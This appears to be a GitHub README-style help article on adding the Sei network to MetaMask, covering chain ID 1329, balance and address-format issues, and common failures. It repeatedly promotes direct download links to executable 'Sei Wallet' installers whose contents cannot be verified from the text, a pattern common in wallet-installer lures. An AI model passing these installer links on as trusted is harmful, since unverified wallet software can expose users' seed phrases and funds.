![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Add Sei to MetaMask, or use a Sei wallet instead</h1>

<p align="center">Add the Sei network to MetaMask, and know what it still cannot do.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

You can add Sei to MetaMask in about two minutes: it is an EVM chain, so MetaMask treats it like any other custom network. What you get afterwards is a wallet that can hold and send SEI at a `0x` address — and cannot stake it, cannot show the legacy `sei1` side, and will not stop you from sending to the wrong network if you are not paying attention.

This article covers the setup, the four things that most often go wrong, and the cases where a native Sei wallet is the better tool.

## Before you start: the five values you need

Adding a custom EVM network always asks for the same five fields:

| Field | Value for Sei mainnet |
|---|---|
| Network name | Sei (any label works; this is only for you) |
| New RPC URL | The public Sei EVM endpoint published in Sei's own documentation — copy it from there, not from a blog post |
| Chain ID | **1329** (hexadecimal `0x531`) |
| Currency symbol | SEI |
| Block explorer URL | Seiscan, Sei's block explorer |

Two of those deserve care. The chain ID must be 1329 for mainnet and 1328 for testnet; a wrong ID produces a wallet that looks connected and shows nothing. And the RPC URL is the one field a malicious guide can change without you noticing, because it looks like a random hostname either way. Take it from Sei's documentation or from the Sei wallet you already trust, and never from a link someone sent you.

## The steps

1. Open MetaMask and select the network dropdown at the top of the window.
2. Choose **Add network**, then **Add a network manually**.
3. Enter the five values above.
4. Save, then select the new network.
5. Check the chain ID MetaMask displays for that network. If it is not 1329, edit it before sending anything.

That is the whole setup. The first time you switch to Sei, MetaMask may show a zero balance even for an address that holds SEI — see the next section, because there are two different reasons for that and only one of them is a problem.

## Why the balance can look empty

**You are on the wrong network.** MetaMask shows balances per chain. A `0x` address with SEI on Sei mainnet shows nothing while Ethereum is selected. Check the network indicator before concluding anything.

**The account is not associated.** Sei accounts have both a `0x` and a `sei1` address, and until the account is associated the two spaces behave independently. If SEI was sent to the `sei1` form, the `0x` view legitimately shows zero. The mechanic is explained in [the two address formats](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md), and the fix is usually to look at the other view rather than to move funds again.

**The address itself is a different account.** Wallets derive accounts differently. If you imported a seed phrase into MetaMask from another wallet, the account you land on may not be the one that holds the funds. Confirm the address character by character against the source wallet before sending anything. [Finding your address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md) covers where each wallet shows it.

## The four failures people actually hit

**A swap fails immediately.** MetaMask's built-in swap routes through aggregators that may not support Sei, and the network needs a minimum gas price that a generic estimate can undercut. If swaps fail while plain sends work, the problem is the swap route, not the network settings.

**A token does not appear.** Native SEI shows automatically; other tokens on Sei need their contract address imported. A token that "isn't there" is usually a token you have not added, and a token you were told to add by a stranger is a common scam shape.

**A transaction sits pending.** Sei has fast finality, so a transaction that stays pending usually means a gas price below the network minimum rather than congestion. Read [the stuck-transaction guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) before resending — resending at the same price produces a second pending transaction, not a faster one.

**Nothing loads at all.** A public RPC endpoint can rate-limit you. If every call fails while the rest of your internet works, switch the RPC. The options and what they change are in [RPC endpoints](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md).

## What MetaMask cannot do on Sei

- **It cannot stake.** Delegation, reward claiming and unbonding are not part of its feature set on any chain. If staking is the reason you are here, a wallet with native staking is the shorter path.
- **It cannot show the `sei1` side** of an account, so an unassociated balance is invisible to it.
- **It will not warn you about Sei-specific address confusion.** It treats Sei like any EVM chain, which is exactly what it is, but also means the address-format trap is yours to avoid.

## When a native Sei wallet is the better choice

A desktop Sei wallet does the things MetaMask structurally will not: native staking, hardware-wallet routing for Sei specifically, a dApp browser pointed at Sei applications, and one place where both address forms are visible. It is also a single application you download and verify, rather than an extension whose fake clone looks identical in a browser listing.

What that product is, and what it explicitly does not promise, is set out in [the product overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

The honest split is this: MetaMask is the right answer if you already live in it and only need to hold or move SEI. A native wallet is the right answer if you intend to stake, use Sei dApps regularly, or want both address forms in one view.

## Chain settings are a recurring theme

Anything that touches chain ID, RPC or currency symbol is the same three values in a different form, whether you are adding Sei to MetaMask, to Rabby, or checking why a dApp says "wrong network". The dedicated walkthrough is [the chain settings walkthrough](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md).

## Frequently asked questions

**Does MetaMask support Sei?** Not out of the box. It supports Sei as a custom EVM network, which you add manually with chain ID 1329.

**Can you store SEI on MetaMask?** Yes, at a `0x` address, once the Sei network is added. Staking and the `sei1` view are not available there.

**Can you add Sei to MetaMask on mobile?** The mobile app supports custom networks in its settings, though the menu path differs from the desktop extension.

**Is Sei on MetaMask by default?** No. A fresh install lists Ethereum and a few popular networks; Sei is not among the defaults.

**What is Sei's chain ID?** 1329 for mainnet and 1328 for testnet. Entering the testnet ID on mainnet is a silent failure — the wallet connects and shows nothing.

**What coins can MetaMask hold on Sei?** Native SEI, plus any Sei token whose contract you import. It does not discover tokens for you.

**How do I add SEI to Trust Wallet?** Trust Wallet handles Sei through its own network list rather than a manual chain form. Check its current supported networks before assuming your version does; the same `0x` versus `sei1` caution applies.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Where to find your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [RPC endpoints for Sei Wallet and what they change](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md)
